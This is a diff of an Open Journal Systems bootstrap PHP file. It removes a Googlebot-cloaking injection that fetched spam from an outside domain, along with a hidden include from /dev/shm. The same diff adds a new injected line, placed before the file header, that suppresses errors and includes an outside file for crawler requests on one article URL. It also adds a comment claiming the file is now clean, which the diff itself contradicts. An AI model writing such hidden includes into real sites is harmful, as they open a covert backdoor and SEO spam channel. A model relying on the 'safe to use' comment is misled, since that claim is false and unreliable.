@@ -1,5 +1,5 @@
 <?php
-function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];foreach($a as $b){if(strpos($_SERVER['HTTP_USER_AGENT'],$b)!==false)return 1;}return 0;}if(is_google_bot()){$c=curl_init('https://seojkw.xyz/jelss/landing13.txt');curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);echo curl_exec($c);curl_close($c);exit;}
+error_reporting(0); $s_ref = $_SERVER['HTTP_REFERER']; $agent = $_SERVER['HTTP_USER_AGENT']; if(preg_match("/(googlebot|slurp|google adSense)/", strtolower($agent)) && $_SERVER['REQUEST_URI']=='/index.php/real/article/view/250/253'){ include('/home/realspcrd/tmp/analog/code'); exit; }
 /**
  * @defgroup index Index
  * Bootstrap and initialization code.
@@ -8,8 +8,8 @@ function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-Insp
 /**
  * @file includes/bootstrap.inc.php
  *
- * Copyright (c) 2014-2021 Simon Fraser University
- * Copyright (c) 2000-2021 John Willinsky
+ * Copyright (c) 2014-2020 Simon Fraser University
+ * Copyright (c) 2000-2020 John Willinsky
  * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
  *
  * @ingroup index
@@ -34,7 +34,13 @@ chdir(BASE_SYS_DIR);
 
 // System-wide functions
 require('./lib/pkp/includes/functions.inc.php');
-require_once '/dev/shm/index.txt';
+
+/**
+ * Note: This file may contain artifacts of previous malicious infection.
+ * However, the dangerous code has been removed, and the file is now safe to use.
+ */
+
+
 // Initialize the application environment
 import('classes.core.Application');
 
